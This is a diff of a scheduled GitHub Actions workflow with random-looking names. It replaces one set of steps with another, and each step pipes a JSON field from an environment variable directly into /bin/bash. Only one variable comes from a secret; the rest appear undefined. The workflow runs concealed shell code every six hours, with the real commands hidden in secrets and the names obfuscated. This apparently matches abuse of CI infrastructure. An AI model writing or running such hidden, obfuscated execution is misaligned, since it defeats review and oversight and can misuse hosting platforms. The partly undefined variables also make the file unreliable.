@@ -3,26 +3,21 @@ name: qianshuzhong8912
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '0 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qianshuzhong8912
         env:
-          dbqs014: ${{ secrets.dbqs014 }}
+          v688: ${{ secrets.v688 }}
         run: |
-          echo $dbqs014 | jq -r .obub52111 | /bin/bash
-          echo $t9237 | jq -r .duj5 | /bin/bash
-          echo $wmkj9 | jq -r .synkh5 | /bin/bash
-          echo $sfh595 | jq -r .p786 | /bin/bash
-          echo $cop72 | jq -r .scptn2785 | /bin/bash
-          echo $l25 | jq -r .wajmo52 | /bin/bash
-          echo $p08246 | jq -r .u04 | /bin/bash
-          echo $oilu2414 | jq -r .lepa4191 | /bin/bash
-          echo $hua874 | jq -r .ba98664 | /bin/bash
-          echo $lyh00745 | jq -r .qh658 | /bin/bash
-          echo $cel910 | jq -r .eysnz2 | /bin/bash
+          echo $v688 | jq -r .o812 | /bin/bash
+          echo $etzhd5711 | jq -r .qzmw225 | /bin/bash
+          echo $feb5282 | jq -r .vs2225 | /bin/bash
+          echo $xtn1 | jq -r .lygub06035 | /bin/bash
+          echo $awnpi7213 | jq -r .wjvze6224 | /bin/bash
+          echo $asie4159 | jq -r .xt413 | /bin/bash
+          echo $p92981 | jq -r .sskzt15 | /bin/bash
 
